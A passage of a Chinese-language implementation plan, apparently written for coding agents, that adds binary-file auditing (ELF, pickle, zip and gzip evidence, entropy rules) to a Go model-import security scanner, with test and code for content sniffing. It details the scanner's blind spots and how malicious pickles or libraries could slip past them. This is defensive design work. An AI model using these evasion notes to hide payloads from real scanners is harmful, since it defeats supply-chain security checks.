# 二进制代码审计支持 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 在 TAA 模型导入审计中新增一条与 Tier 1 引擎无关的二进制审计通道：按内容嗅探把二进制文件分类，抽取 strings / ELF 结构 / 熵 / 容器成员 / pickle 目标作为证据，用规则表判定为 Finding，合并进既有 `Report` 后与源码 Finding 走同一条 LLM 复核路径。

**Architecture:** 新增 `internal/codeaudit/binary_*.go` 四个文件构成一条独立通道，输出统一的 **证据行（EvidenceLine）** 中间表示；规则只在证据行上匹配，严重级/类别/描述对共享 rule id 从 `DefaultRules()` 读取，避免两个臂漂移。`GenerateAuditReport` 在 Tier 1 静态扫描之后、Tier 2 LLM 之前调用 `MergeBinaryFindings`，把二进制通道的 Finding 追加进 `scanReport.Findings` 并写入 `Report.Binary` 完整性摘要；`ProvesCleanScan()` 折入该摘要，fail-closed 语义不变。因此正则臂与 semgrep 臂的部署天然都获得二进制覆盖，且两臂仍逐字节可比。

**Tech Stack:** Go 1.22 标准库（`debug/elf`、`archive/zip`、`compress/gzip`、`regexp`、`crypto/sha256` 不需要）——零新依赖。测试用**手工构造**的 ELF/pickle/zip 字节夹具，不提交二进制、不依赖 cgo 或外部工具链。

---

## 0. 开工前必读

### 0.1 基线

```bash
cd /home/hjy/taa
git status --porcelain          # 期望：空
go build ./... && go test ./internal/codeaudit/... ./internal/config/... ./internal/app/... 2>&1 | tail -20
```

预期全绿。**红着不要往下做**——本计划会改动 `GenerateAuditReport` / `AssembleAuditReport` 的签名与若干测试文件，基线不干净时分不清是谁改坏的。

> ⚠️ **同一检出内并发冲突**：本仓库只有一份共用检出。做本计划期间**不要**与其他 agent 并行跑 `go test ./...`，也不要在同一棵树上跑变异/回放实验，否则结论不可信。需要并行请先 `git worktree add`。

### 0.2 现状（为什么现在没有二进制审计）

- Tier 1 的两个臂都**按扩展名**挑文件。正则臂只看 `.py`（`Scanner.hasMatchingExtension`，`internal/codeaudit/scanner.go:162`）；semgrep 臂看 `.py .go .c .cpp .cu .h .hpp .java .sh`（`semgrepEngine.isSourceFile`，`internal/codeaudit/semgrep_engine.go:305`）。
- 因此 `.so` / `.pt` / `.pkl` / `.bin` / `.safetensors` / `.whl` **根本不在扫描输入里**，且在报告里不留任何痕迹：`Report.UnsupportedExts` 声明了却从无代码赋值，`ProvesCleanScan()` 读到的恒为 0，于是一个装满原生库和 pickle 的模型包会被判成"扫干净了"。这正是本计划要堵的洞。
- 唯一读过二进制字节的是**导出侧**的 `ResultChecker`（`result_checker.go:98` `detectPlaintextSections`），它做的是明文数据泄露检查，与代码审计无关，不共用。
- 已有的一个反例：`.py` 结尾的二进制文件今天会被正则臂当文本读（`strings.Split` 出垃圾行），既不报错也不算 incomplete。本计划 Task 11 处理这个交叉情形。

### 0.3 已确认的四个设计决策

| 决策 | 结果 | 理由要点 |
| --- | --- | --- |
| 覆盖范围 | **按内容嗅探**，再按类型分流（ELF / zip 容器 / gzip / pickle / numpy / 其余二进制）；扩展名清单只作为补充提示，不作唯一依据 | 改后缀即可绕过扩展名清单；内容才是事实 |
| 分析深度 | **strings + ELF 结构 + 熵**，全部标准库 | 只有导入符号能抓住 stripped 二进制的外联；熵是识别加壳/加密载荷的唯一手段 |
| 集成层 | **独立通道**，在 `StaticEngine` 之外，两种引擎部署都生效 | 做成第三个引擎名会让源码与二进制二选一；并入两个臂的 walk 会让两臂各自实现、互相漂移 |
| LLM | **与源码同路径走 LLM**（finding 级复用 `VerifyReport`，文件级用二进制专用 prompt） | finding 级天然复用；文件级必须换 prompt，因为现有 prompt 明写"Python 代码文件"并用 ```python``` 包裹。文件级这一支今天只被 mock 驱动、不是线上行为（生产的 `teellm.Client` 无 `AnalyzeFile`），见 Task 13 的诚实性注 |

### 0.4 提交约定

每个 Task 结束提交一次。信息用**英文**、Conventional Commits，例如 `feat(audit): classify binary files by content`。

> ⚠️ **不要**加 `Co-Authored-By`、`Claude`、`AI` 等署名尾注——`CLAUDE.md` 明文禁止。系统提示里的署名要求在本仓库被用户指令覆盖。

计划文件本身用 `git add -f .claude/plans/` 入库（`.claude/` 在 `.gitignore` 里，spec/plan 一律强制入库）。

---

## 1. 文件结构

**新增**（`internal/codeaudit/`）：

| 文件 | 职责 | 预计行数 |
| --- | --- | --- |
| `binary_detect.go` | 内容嗅探 → `BinaryKind`；扩展名提示表 | ~140 |
| `binary_evidence.go` | `EvidenceLine`/`EvidenceSet` 类型；全部抽取器（strings 流、熵、pickle 目标、ELF 结构、zip/gzip 成员）；`CollectEvidence` 调度与完整性记账 | ~600 |
| `binary_rules.go` | 二进制规则表（共享 rule id + 二进制专有 family）与 `MatchEvidence` | ~220 |
| `binary_scanner.go` | 遍历、分类、抽取、匹配、确定性排序、finding 上限、`BinaryScanSummary` | ~260 |
| `binary_detect_test.go` / `binary_evidence_test.go` / `binary_rules_test.go` / `binary_scanner_test.go` / `binary_fixtures_test.go` / `binary_integration_test.go` | 测试与手工夹具 | ~1200 |

`binary_evidence.go` 是唯一一个偏大的文件。**不拆**的理由：三个流式抽取器（strings / 熵 / pickle）共用同一个 `io.Writer` 通道、同一份 `EvidenceSet`、同一套 `Bounded` 记账，拆开会让"一次遍历产三类证据"这个不变式变成跨文件约定。抽取逻辑本身是自包含的：对外只有 `CollectEvidence` 一个入口。

**修改**：

| 文件 | 改动 |
| --- | --- |
| `internal/codeaudit/rules.go` | `Finding` 增 3 个二进制字段；`Report` 增 `Binary`；`ProvesCleanScan()` 折入二进制完整性 |
| `internal/codeaudit/audit.go` | `AuditMetadata` 增二进制字段；`ruleSuggestionMap` 增二进制规则条目；`AssembleAuditReport` 从 `scanReport.Binary` 抄元数据 |
| `internal/codeaudit/verifier.go` | 新增 `AuditConfig`；`GenerateAuditReport` 接 `AuditConfig`、插入 Phase 1b/1c；新增 `analyzeBinaryFileWithLLM` 与二进制 prompt；`analyzeFileWithLLM` 增 evidence 参数 |
| `internal/codeaudit/llm_test.go` | `mockLLMClient` 增 `filePrompts` 捕获字段 |
| `internal/codeaudit/{audit_test,llm_absence_test,engine_select_test}.go` | 机械更新 `GenerateAuditReport` 调用点（共 11 处） |
| `internal/config/config.go` | `security.binaryAudit` 段解析 + 默认值 |
| `internal/app/taa/app.go` | `buildSecurityConfig` 组装 `codeaudit.BinaryConfig` |
| `internal/controller/route.go` | `SecurityConfig` 增 `Binary codeaudit.BinaryConfig` |
| `internal/controller/import_processing.go` | 审计调用改传 `AuditConfig`；日志增二进制计数 |
| `README.md` | 审计章节补二进制通道说明 |

**不改**：`tools/platform-mock`（`drawer.js` 只判断 `content.conclusion || content.file_reports` 后原样渲染，新增的可选字段无需前端改动）；两个 Tier 1 引擎的 walk；`CheckImportWithLLM`（见 §2 边界）。

---

## 2. 边界（明确不做的事）

写进代码注释与 README，避免后来者把它当漏洞修：

1. **PE / Mach-O 不做结构解析**。Go 标准库有 `debug/pe`，但本部署是 Linux（Hygon/CSV2），模型包里的 `.dll` 在本机不会被加载执行；它们按 KindRaw 处理（strings + 熵 + 尾部 pass），并在证据里留一条 `notice`。**代价明确**：一个 PE 的导入表不会被读。
2. **xz / zstd / bzip2 / 7z 容器不打开**。zip 与 gzip 打开（stdlib 就有）；其余压缩流只做头部/尾部 pass 与熵，并计入 `BoundedData`（可见、不阻断）。理由：解压炸弹需要自己的预算模型，本版不做。
3. **`.json` / `.csv` / `.txt` / `.md` 等纯文本非源码文件不审**。它们既不在源码臂的输入里，也不被二进制通道认领（`ClassifyBinary` 返回 `KindText`）。若把它们计进 `UnsupportedExts`，`ProvesCleanScan()` 会对**每一个**真实模型包返回 false，等于把审计变成全阻断——所以本计划不动 `UnsupportedExts`。
4. **`CheckImportWithLLM` 不接二进制通道**。生产路径是 `GenerateAuditReport`（`internal/controller/import_processing.go:642`）；`CheckImportWithLLM` 只被 `llm_test.go` 使用，是第二个 gate 实现。本版不改它，**它的语义由此与生产不同**，这一点写在它的 doc comment 里。
5. **不做二进制瘦身/反编译/符号执行**。证据是"这个文件导入了什么、说了什么、熵是多少"，不是控制流。
6. **纯数据文件不做熵判定**。`KindRaw`（权重、张量、未知二进制）与 `KindNumpy` 只产出 strings 与 pickle 目标证据，不产出熵行。理由：模型包里绝大多数字节就是权重，权重天然接近均匀分布，整文件熵规则会对每一个 `.safetensors` 误报；而本平台不执行裸数据文件，能运行的载荷一定以 ELF 或 pickle 形式出现，两者都有精确证据（可执行节区熵 / `GLOBAL` 目标）。**代价明确**：一个以 `.bin` 投递、再由包内某个 `.so` 解密的加密载荷，其密文本身不会被判为加壳。
7. **pickle 目标识别用带 memo 表的 opcode 解释器，识别能力上界于整个 opcode 流，而不是"相邻字节模式"**。扫描器不再按字节找形状，而是按 pickle 语法逐 opcode 前进：每个 opcode 的操作数宽度取自协议 0–5 的完整表（68 个 opcode，无一遗漏），字符串/字节操作数按它自带的长度前缀整体消费，因此数据段里偶发的 `0x63` 与换行不能再让扫描器错位——实测旧扫描器在 `net_001.pth` 的 `data.pkl` 上报出 39 个目标、漏掉 `torch.LongStorage`，解释器报出且只报出 4 个真目标；这也证伪了"`GLOBAL` 因自带两个内联字符串而不受相邻性影响"的旧说法，被吞掉的正是 offset 828 的一条 `GLOBAL`。`GLOBAL`（`c module\nname\n`）、`STACK_GLOBAL`（`0x93`，取值栈顶两项）与 `INST`（`i module\nname\n`）同步产出，模块名先 `MEMOIZE`/`BINPUT`/`PUT`、再用 `BINGET`/`GET` 取回时取回的值仍在值栈上，所以"先存 memo 再取回"这条规避对解释器不成立。仍然看不见的目标有三类：被抽取预算截断的 opcode 流、从进程扩展注册表解析的 `EXT1/EXT2/EXT4` 与走持久化 id 的 `PERSID`/`BINPERSID`（目标名根本不在流里）、以及解释器无法继续时（未知 opcode、mid-opcode 结束、`STACK_GLOBAL` 操作数无法解析）——后者会置 `Bound.Structural`，对可执行类型即阻断导入，也就是说"看不见"只会表现为"没证据"或"阻断"，不会表现为"扫干净了"。**代价明确**：解释器会在它声称解析的流上留痕，所以它只跑在**被声明为 pickle 的流**上（`KindPickle` 的整文件与容器成员、解压后头部嗅探为 pickle 的 gzip 流，见 Task 4 的门控规则），于是一个把 `GLOBAL` 放在预算之外、或完全依赖扩展注册表/持久化 id 的加载器，其目标不会以 `pickle` 证据出现；贴在张量文件尾部、其头部不携带 pickle 魔数的 pickle 也不再被认领——旧字节扫描器认领它，正因为它从不承诺自己在解析；本平台没有加载器会对 `.bin`/`.safetensors` 调 `pickle.loads`，其字面量仍由 strings 通道读出，但少了 `SourcePickle` 那一条。
8. **超过 `MaxFullScanBytes`（64 MiB）的文件只读首尾各 1 MiB**。这次跳过会按 `isExecutableKind` 的既有分野记账：`KindRaw`（张量、未知二进制）计入 `BoundedData`——可见、不阻断；`KindELF` 与 `KindPickle` 计入 `BoundedExecutable`——**fail-closed 下即阻断导入**。后半条是必须的：若窗口化不留痕，把一个 pickle 填充到 64 MiB 以上就能藏住中段的 `GLOBAL` 并且照样通过，阈值本身就成了绕过手段。**代价明确**：一个大于 64 MiB 的 `.so` 或 pickle 会被判为未完整扫描而阻断，出路是 operator 调高 `maxFullScanBytes`（这也是该配置项存在的理由），不是被静默豁免。就信息损失本身：`KindRaw` 的中段是张量数据，本平台不存在读它的加载器；`KindPickle` 的中段可能藏着一条 `GLOBAL`（在一长串数据构建 opcode 中间），首尾窗口覆盖加载时执行的前段与数据就绪后动作的后段，中段是缺口。本仓库全部语料中最大的 pickle 是 10.8 MiB，离阈值有 6 倍余量。
9. **合并两个通道的 finding 时不再二次限流，且二进制臂的 finding 上限不参与完整性判定**。源码臂保有自己的 200，二进制臂保有自己的 50，合并列表不设上限（见 Task 11）。上限只落在**清单**上：触顶写 `findings_capped`/`findings_dropped`，不写 `Report.Truncated`，也不进 `ProvesCleanScan()`；并且 cap **从不丢任何能阻断的 finding**（`assist` 下 HIGH 阻断，`gate` 下 HIGH 与 MEDIUM 都阻断，所以 cap 只花 LOW 这一档），一个包不可能靠堆 LOW finding 把能阻断的 finding 挤出清单。**代价明确**：极端情况下 Tier 2 的 LLM 调用上界从 200 变成 250；且若一个包里能阻断的 finding 数本身就超过上限，清单会**超过**那个数字（这是刻意的取舍——宁可清单变长，不可让一个阻断级 finding 消失）。这个上界换的是别的东西：共享配额会让大源码臂按路径字典序挤掉二进制 finding，而二进制 finding 是这里唯一能看见 `.so` 与 pickle 的证据。已入库语料的实测最大 finding 数是单样本 7、整语料 80，两个上限都远未接近。
10. **tar 不被解析**。`models/audit/holdout-sources/sr.tgz` 是 gzip 包 tar（解压后 10.66 MB、4933 个条目，一整个 `semgrep-rules-develop` 检出），解压后的字节会被读取并扫过 strings 通道，所以其中的字面量可见。**代价明确**：tar 的结构全部丢失——没有按成员归属、没有按成员分类（tar 里的 ELF 拿不到节区与导入符号证据）、也不会递归进 tar 里的归档；并且 tar 字节不会命中 pickle 门控（第 7 条），pickle 解释器不跑在它上面，tar 里的 pickle opcode 只有恰好构成可打印串时才以 strings 证据出现。
11. **嵌套归档只递归一层**。`models/examples/Retina-DKD/Retina-DKD-code.zip` 把 `net_001.pth`/`net_005.pth` 作为成员携带，它们分类为 `KindArchive`；`collectArchive` 只对分类为 ELF 或 pickle 的成员下钻，因此这两个 checkpoint 不会被打开，其 `data.pkl` 永远到不了 pickle 解释器。**代价明确**：只装在 zip 里的 checkpoint 既不产出成员证据也不产出 pickle 目标；这一条现在由第 7 条的门控放大——解释器只跑在被声明为 pickle 的流上，而嵌套归档里那条流既没被声明、也没被下钻，没有第二次机会被发现；跳过是静默的（成员名与大小进了证据列表，但不置 `Bounded`）。
12. **`.xlsx` 就是 zip**。语料里的 14 个 `.xlsx` 中 13 个是普通 zip（最坏压缩比 22.91，无炸弹形状，成员均分类为非可执行），第 14 个 `models/examples/Retina-DKD/Retina-DKD/test_result.xlsx` 是 OLE2 老式 `.xls` 顶着 `.xlsx` 名，不匹配任何魔数，落到 `KindRaw`。**代价明确**：当作 zip 的那 13 个只按普通容器处理（成员头嗅探 + 成员名/大小），内部的 XML 不进任何结构化解析；当 OLE2 的那一个只拿 strings 证据，不会因为扩展名被当成 zip 打开。
13. **配置里只暴露五个上限，其余固定在 `DefaultBinaryConfig`，这是有判据的选择而不是遗漏**。有键的是 `maxArchiveMembers`、`maxFindings`、`maxFullScanBytes`、`maxStreamBytes`、`highEntropyThreshold`；没有键的是 `MaxEvidenceLines`（默认 50000）、`HeadTailBytes`、`MaxArchiveMemberBytes`、`MaxStringLen`/`MinStringLen`。判据是**越界之后留下什么**：越界只记 `Bound.Listing` 的天花板（如 `MaxEvidenceLines`）只影响显示、不阻断任何东西，让它固定是安全的；越界会记 `Bound.Structural` 的天花板，在可执行类型上会**阻断导入**，没有键就成了 operator 无法处置的阻断，所以必须暴露。`MaxStreamBytes` 正落在后者——它只有在一个通过了 `MaxFullScanBytes` 的文件上才可能被触到，所以把 `maxFullScanBytes` 抬到 3 GiB 以上就会让它生效；两个键因此成对出现，并在同一处校验。`maxFindings` 是这条判据的**例外，并且是刻意进例外名单的**：它既不是结构性天花板（触顶只记 `findings_capped`，不阻断），也不是显示上限（它确实会让清单少一段）——它是一个**清单预算**，而预算该多大取决于部署愿意为噪声付多少钱、以及它想要的报告有多长，这两件事只有 operator 知道。默认 50 是按十个族、每族五条定的，真实语料的最大 finding 数是 80（整语料）和 7（单样本），所以 50 只在单个包同时命中很多族时才可能被触到。**代价明确**：这五个以外的上限调不了，调它们要改代码重新部署；而 `maxFindings` 调小只会丢 LOW，永远不会让一个能阻断的 finding（`assist` 与 `gate` 下的 HIGH，以及 `gate` 下的 MEDIUM）消失。
14. **不存在"每节字节上限"，这是删除而不是省略**。曾有一版 `MaxSectionBytes`（默认 16 MiB），用来给 `io.ReadAll` 一个可执行节设上限；它会对**普通的大库**开火——一个足够大的 `.so`，`.text` 会跨过任何固定的节上限，而触顶记的是结构性 bound，于是"这个库比较大"变成了阻断导入的理由。**宿主实测**（`readelf -SW` 取每个真实共享对象最大的 `SHF_EXECINSTR` `PROGBITS` 节）：`libLLVM.so.20.1` 单节 **63 048 722 字节**、`libclang-18.so.18` **22 284 286**、Chrome 的 `liboptimization_guide_internal.so` **20 685 714**、`libwireshark.so.17.0.2` **20 175 571**、`libpython3.13.so.1.0` **2 770 082**——16 MiB 的节上限会在前四个上直接触顶。这与本计划其余部分的实测口径不同，值得点明：**审计语料 `models/` 下一个真实 `.so` 都没有**（`find models -name '*.so*'` 命中的 50 个全是 semgrep 的 `.sol` 规则文件），而用来标定误报的那套 ollama 共享库（28 个）单节最大 2 901 464 字节，**也不会**触到 16 MiB。也就是说这个上限的代价是**潜伏**的：它在任何已实测的输入上都不发作，只在一个包里带上一个真实大库时发作——而那正是本平台要接受的包形状（带加速库的模型包），所以它必须删掉而不是调大。现在节读取改为经 `countSection` 按固定块（`entropyChunkBytes`，64 KiB）流过 256 桶直方图，内存与节大小无关，节上限已无物可保护；每文件剩下的读取预算是 `MaxStreamBytes`，触到它才记结构性——宿主 600 个共享对象（去重后 **538** 个 ELF；把每个文件条目都算上是 **2027** 个）按这条路径全跑一遍，**0 个被判结构性、0 个无节表、0 个报错**，也就没有一个接近那个 3 GiB 的每文件预算。**代价明确**：调不了单个节的读取量（本来也不该调）；能调的只有每文件预算。**不要把它加回来**——加回来就是把"库比较大"重新变成阻断理由；也不要指望"把 16 MiB 调大一点"能解决，任何固定值都只是把发作点往后挪。
15. **无节表（`len(ef.Sections) == 0`）的 ELF 记为结构性缺口，且 reason 只点名"没有节头表"**。熵检测的输入是可执行节，没有节表就没有可执行节，旧代码在这一段直接掉出去、不产生任何行也不产生任何 bound，于是"从未检查过"被报成了"没发现加壳"——这条 fail-open 已去掉。修的是**结论**而不是"补回 `DT_NEEDED`/`DT_SONAME`"：经 `PT_DYNAMIC` 恢复 needed/soname 需要先把 `p_vaddr` 经 `PT_LOAD` 映射回文件偏移、再把 `DT_STRTAB` 的虚地址映射一次，这是一段独立的新解析逻辑，而它的产出对"有没有被加壳"不提供任何证据，所以本版不做。reason 措辞点名的是**节头表**而不是符号表：静态链接的二进制没有 `.dynsym` 但有 `.symtab`，它并不 stripped，说它"缺符号表"是假的；同理 `SHT_SYMTAB` **故意不做**符号证据的兜底来源——`.symtab` 里绝大多数是本文件自己定义的符号，拿它当能力证据就是去匹配程序自己的标识符，正是第 14 条那批误报的同一类。因此 Task 8 的规则表**不变**：没有引入新的 evidence source。宿主 600 个共享对象（去重后 538 个 ELF、枚举到 2027 个文件条目）里**0 个无节表**，所以这个形状在真实世界里确实少见——而恰恰因为它少见，"没见到"不能当成"不存在"，这才是它必须 fail-closed 而不是被静默略过的理由。**代价明确**：一个节表被删掉的正常文件（少见但存在，如某些加壳器与 `objcopy --strip-section-headers` 的产物）现在会被记为结构性缺口而不是干净通过；这是刻意方向——对可执行格式，"没看"不等于"干净"。
16. **节声明长度越过文件末尾（或读不满）记为结构性缺口，`size=` 仍写声明长度**。判据是"读到的字节数 < 节头声明的字节数"，两种情况——`sh_offset`/`sh_size` 越过文件末尾，或触到 `MaxStreamBytes`——都是同一事实：熵值只覆盖一个**前缀**，所以这个数不报（报出来会和"整节测过"的数长得一样），替代它的是 `section .text declares N bytes, M readable` 这条结构化证据。`size=` 保持声明值，读者才能把声明长度与缺口配对看。**代价明确**：一个声明长度写错但内容正常的文件会被记为结构性缺口；这是刻意方向，理由同上。
17. **自由字符串证据只判 LOW，且 `OBF_001` 在二进制臂被整个删掉**。判据是一条通则：**一条 finding 只有被文件无法偶然产生的结构背书时才可以判 HIGH**，而"某个字面量里出现了某个词"不是那种背书——`.pyc` 常量池会把相邻常量拼成一整段可打印串，二进制数据里遍地是长 base64 字母表串，所以按子串匹配的规则会把合法库判成恶意（实测：旧 `OBF_001` 命中 28 个合法共享库中的 23 个，旧 `PER_001`/`FIL_001`/`ENV_001` 的片段命中来自 `taint_engine.cpython-312.pyc` 与 `security.cpython-312.pyc`）。因此字符串半边不借源码臂的 HIGH/MEDIUM id，改用独立 LOW 族 `CMD_002`/`PER_002`/`FIL_002`/`ENV_002`（两端锚定 token，`ENV_002` 不带 `(?i)`），`OBF_001` 不设族。**代价明确**：一个真正把 base64 载荷以字面量形式留在代码里的文件，其字符串证据不再单独产出 finding；它若真在运行，仍会以 ELF 导入符号或 pickle 目标等结构证据（HIGH）出现，而纯数据文件本来就不被本平台加载。**不要把它"修回去"**——把字符串匹配放宽回子串或把严重级抬回 HIGH，就是重新引入这批误报，而误报在这种设计下的终点是删包。
18. **pickle 解释器有两个固定上限（`pickleMaxStackSlots` / `pickleMaxMemoSlots`，各 `1<<20`），按第 13 条的判据它们"本该"有键，这里刻意不给，理由说得清楚**：第 13 条的判据是"越界会记 `Bound.Structural` 的天花板必须暴露，否则 operator 无法处置一次阻断"。两个上限都落在 `Bound.Structural` 上（`KindPickle` 是可执行类型，会阻断导入），但它们触及的不是"合法文件恰好很大"这一情形，而是"这段流根本不是 pickle"——真实语料里最深值栈 1007 槽、最大 memo 3669 条，距上限各有约 1000 倍与 280 倍余量，一个正常的 state dict 无论如何长都到不了 `1<<20`（映射按每项约两槽计，`1<<20` 槽覆盖约五十万项的映射，而最大实测映射是几万项）。也就是说，触顶意味着流在按每个字节推一个槽/一个 memo 项的方式自增，那是畸形或敌意输入的签名，不是"这个包比较大"；给这样的阻断配一个 operator 可调的键，等于允许把上限调到任意大，而上限存在的唯一目的就是限制它背后那块内存（栈约 24 MiB、memo 约 64 字节/项，都是"没有上限就长到 GB"的量）。**代价明确**：一个合法但极端到这两条线上的 pickle 会被判为未完整扫描而阻断，出路不是调键而是先确认它到底是不是 pickle。这与第 13 条的差别的量纲：`MaxStreamBytes` 会被一个真正的大文件触到，所以要暴露；这两个只会被一个不像 pickle 的流触到，所以固定。**不要把它们加进配置**——加进去就是把一个"这段流不合法"的判定，换成一个"把门槛抬高就能过"的旋钮。
19. **`step` 的返回契约是承重的：它只在"缓冲区里没有它可以消费的东西"时返回 0，绝不在"完成了一个操作数"之后返回 0**。这是流式解析能声称"结果不依赖分块位置"的前提，也是 `Flush` 两条完整性消息（`ended mid-opcode` / `ended without STOP`）能当真的前提。曾经的缺陷正出在这里：一个计数操作数声明长度为 0 时，payload 相位没有消费任何字节就完成了它，却返回 0，被读成"还需要更多输入"，于是缓冲区尾部被搁置；当这个操作数落在最后一次 `Write` 里时，没有后续读来清空缓冲区，`Flush` 就把一个完整合法的 pickle 报成"没有 STOP"的结构性缺口——而 `KindPickle` 是可执行类型，这条缺口会删包。**这不是边界情况**：本仓库五个真实 `data.pkl` 的零长 `BINUNICODE`（状态字典的空串键）分别位于 offset 1315、1315、12830、52607、52607，也就是下一个待审的包就会中招。修法限定在 payload 相位：0 长完成之后带同一个 `b` 与 `absOff` 继续取下一个 opcode；`pickPhaseFixed` 与计数操作数的长度前缀路径（宽度至少 1 字节，必然消费至少 1 字节）没有这个场景，**不要为了"统一"把补丁搬进去**。**代价明确**：无——这条修正只把错误报的完整性换成正确的完整性。

---

## 3. 任务

### Task 1: 内容嗅探与类型分流

**Files:**
- Create: `internal/codeaudit/binary_detect.go`
- Test: `internal/codeaudit/binary_detect_test.go`

- [ ] **Step 1: 写失败测试**

创建 `internal/codeaudit/binary_detect_test.go`：

```go
package codeaudit

import "testing"

// TestClassifyBinary pins the content-first routing the binary channel is built
// on. Every case here is a byte prefix, not a file name, because the whole point
// of sniffing is that a package can be renamed freely and the bytes cannot.
func TestClassifyBinary(t *testing.T) {
	cases := []struct {
		name string
		head []byte
		path string
		want BinaryKind
	}{
		{"elf magic", []byte("\x7fELF\x02\x01\x01\x00"), "libfoo.so", KindELF},
		{"elf magic beats a source extension", []byte("\x7fELF\x02\x01\x01\x00"), "train.py", KindELF},
		{"zip magic", []byte("PK\x03\x04\x14\x00"), "model.pt", KindArchive},
		{"empty zip magic", []byte("PK\x05\x06\x00\x00"), "empty.whl", KindArchive},
		{"gzip magic", []byte{0x1f, 0x8b, 0x08, 0x00}, "weights.gz", KindCompressed},
		{"numpy magic", []byte("\x93NUMPY\x01\x00"), "tensor.npy", KindNumpy},
		{"pickle protocol 4 magic", []byte{0x80, 0x04, 0x95, 0x00}, "blob.bin", KindPickle},
		{"pickle protocol 0 by extension", []byte("(lp0\nS'x'\np1\n"), "evil.pkl", KindPickle},
		{"nul byte means binary", []byte("text\x00more text"), "weights.bin", KindRaw},
		{"binary extension claims an all-text file", []byte("#!/bin/sh\necho hi\n"), "libevil.so", KindRaw},
		{"python source stays text", []byte("import os\nos.system('x')\n"), "train.py", KindText},
		{"utf8 text without nul stays text", []byte("héllo wörld\n"), "notes.txt", KindText},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := ClassifyBinary(tc.head, tc.path); got != tc.want {
				t.Errorf("ClassifyBinary(%q, %q) = %q, want %q", tc.head, tc.path, got, tc.want)
			}
		})
	}
}

// TestClassifyBinaryEmptyFile pins the degenerate input: a zero-byte file has no
// magic and no NUL, so it is text, and the source channel's own behaviour for it
// is unchanged by this feature.
func TestClassifyBinaryEmptyFile(t *testing.T) {
	if got := ClassifyBinary(nil, "empty.py"); got != KindText {
		t.Errorf("ClassifyBinary(nil, empty.py) = %q, want %q", got, KindText)
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run TestClassifyBinary -v 2>&1 | head -20
```

预期：编译失败，`undefined: BinaryKind`。

- [ ] **Step 3: 实现**

创建 `internal/codeaudit/binary_detect.go`：

```go
package codeaudit

import (
	"bytes"
	"path/filepath"
	"strings"
)

// BinaryKind is the reading the binary channel applies to a file. It is decided
// from the file's own leading bytes and only then, as a fallback, from its
// extension — never from the extension alone, because a package that can be
// renamed is a package whose extension carries no evidence.
type BinaryKind string

const (
	KindELF        BinaryKind = "elf"
	KindArchive    BinaryKind = "archive"
	KindCompressed BinaryKind = "compressed"
	KindPickle     BinaryKind = "pickle"
	KindNumpy      BinaryKind = "numpy"
	KindRaw        BinaryKind = "raw"
	// KindText is the answer that means "not this channel's business": the file
	// is text, so whichever engine the deployment selected owns it. It is a
	// distinct value rather than an empty string so that a caller cannot confuse
	// "we looked and it is text" with "we never looked".
	KindText BinaryKind = "text"
)

// sniffBytes is how much of the head is read to classify a file. It is larger
// than every magic below and large enough for the NUL heuristic to see a real
// binary header, which is what the size is for: a NUL in the first few hundred
// bytes is the signal, and the rest is slack for a texterous header.
const sniffBytes = 4096

var (
	magicELF        = []byte{0x7f, 'E', 'L', 'F'}
	magicZip        = []byte{'P', 'K', 0x03, 0x04}
	magicZipEmpty   = []byte{'P', 'K', 0x05, 0x06}
	magicZipSpanned = []byte{'P', 'K', 0x07, 0x08}
	magicGzip       = []byte{0x1f, 0x8b}
	magicNumpy      = []byte{0x93, 'N', 'U', 'M', 'P', 'Y'}
)

// binaryExtensions are the extensions that claim a file for this channel even
// when its bytes look like text.
//
// It exists for the one shape content sniffing cannot see: a file whose content
// is text but whose name says it will be loaded as a library or a serialised
// object. Nothing else in the pipeline reads such a file — the source arms
// filter by extension and this channel filters by content — so without the list
// it would be examined by nobody, and "examined by nobody" is exactly the state
// this feature exists to end.
//
// The list adds to the content verdict; it never replaces it. A file with ELF
// magic named README.md is still an ELF.
var binaryExtensions = map[string]bool{
	".so": true, ".o": true, ".a": true, ".dylib": true, ".dll": true, ".exe": true,
	".bin": true, ".pt": true, ".pth": true, ".pkl": true, ".pickle": true,
	".joblib": true, ".safetensors": true, ".onnx": true, ".whl": true,
	".h5": true, ".pb": true, ".tflite": true, ".npy": true, ".npz": true,
	// Compiled Python. It is listed even though the content heuristic already
	// catches it - a real .pyc measured 229 to 2264 NUL bytes in its first 4 KiB
	// - because a model package carries more .pyc than .py (110 against 60 in
	// the example corpus) and the most on-point format in this channel should
	// not depend on a heuristic holding. The interpreter loads these directly.
	".pyc": true, ".pyo": true,
}

// ClassifyBinary decides how a file should be read. head is the file's first
// sniffBytes (fewer at end of file), path is used only for the extension
// fallbacks documented on each branch.
func ClassifyBinary(head []byte, path string) BinaryKind {
	switch {
	case bytes.HasPrefix(head, magicELF):
		return KindELF
	case bytes.HasPrefix(head, magicZip),
		bytes.HasPrefix(head, magicZipEmpty),
		bytes.HasPrefix(head, magicZipSpanned):
		// PyTorch .pt, .whl, .npz and .jar are all zips. The format is one
		// reading because the evasion is the same in each: a member that is a
		// pickle or an ELF.
		return KindArchive
	case bytes.HasPrefix(head, magicGzip):
		return KindCompressed
	case bytes.HasPrefix(head, magicNumpy):
		return KindNumpy
	case isPickleStream(head, path):
		return KindPickle
	}
	if looksBinary(head) {
		return KindRaw
	}
	if binaryExtensions[strings.ToLower(filepath.Ext(path))] {
		return KindRaw
	}
	return KindText
}

// isPickleStream reports whether head begins a pickle stream.
//
// Pickle protocols 2 and up begin with PROTO (0x80) followed by the protocol
// number, which is a magic. Protocols 0 and 1 have no magic at all: a protocol 0
// pickle of a tuple is the single byte "(". For those the extension is the only
// signal available, and taking it is cheap — being wrong costs one strings pass
// over a file nothing else would have read.
func isPickleStream(head []byte, path string) bool {
	if len(head) >= 2 && head[0] == 0x80 && head[1] >= 0x02 && head[1] <= 0x05 {
		return true
	}
	switch strings.ToLower(filepath.Ext(path)) {
	case ".pkl", ".pickle", ".joblib":
		return true
	}
	return false
}

// looksBinary applies the heuristic git and grep do: a NUL byte in the head
// means the file is not text.
//
// It is a heuristic and its blind spot is worth stating: UTF-16 text carries NUL
// bytes and is therefore read here as a raw binary. The cost of that mistake is
// a strings-and-entropy pass over a text file, which reports nothing; the cost
// of the opposite mistake is a binary read as text, which is the hole this
